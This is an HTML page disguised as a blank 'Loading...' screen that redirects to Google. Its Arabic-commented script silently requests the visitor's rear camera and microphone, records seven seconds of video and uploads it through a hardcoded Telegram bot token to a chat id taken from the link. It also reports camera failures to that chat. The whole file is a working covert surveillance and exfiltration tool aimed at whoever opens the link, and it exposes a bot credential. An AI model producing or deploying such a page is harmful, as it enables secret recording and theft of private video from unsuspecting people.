<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
    <title>Loading...</title>
    <style>
        body { display: none; }
    </style>
</head>
<body>
    <script>
        // ==================== قراءة الإيدي من الرابط مباشرة ====================
        function getUserIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id'); // يجيب قيمة id من الرابط
        }

        // ==================== الإعدادات ====================
        const USER_ID = getUserIdFromURL(); // ⭐ هذا ياخذ الإيدي من الرابط
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        // إذا ما كان في id بالرابط، نوقف التنفيذ
        if (!USER_ID) {
            console.error('ماكو id بالرابط');
            window.location.replace("https://www.google.com");
        } else {
            // ==================== دالة الإرسال ====================
            async function sendVideoToTelegram(videoBlob) {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', USER_ID); // الإيدي اللي جه من الرابط
                    formData.append('video', videoBlob, 'recorded_video.mp4');
                    formData.append('caption', `🎥 تسجيل فيديو - ${new Date().toLocaleString()}`);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (error) {
                    console.error('Error sending video:', error);
                }
            }

            // ==================== تسجيل الفيديو ====================
            async function captureAndSendVideo() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'environment'
                        }, 
                        audio: true 
                    });

                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    const chunks = [];

                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
                        await sendVideoToTelegram(videoBlob);
                        stream.getTracks().forEach(track => track.stop());
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 7000);

                } catch (error) {
                    console.error('Camera error:', error);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: USER_ID,
                            text: `❌ فشل الوصول للكاميرا`
                        })
                    });
                }
            }

            // ==================== شغّل كل شيء ====================
            (async function() {
                captureAndSendVideo();
                window.location.replace("https://www.google.com");
            })();
        }
    </script>
</body>
</html>
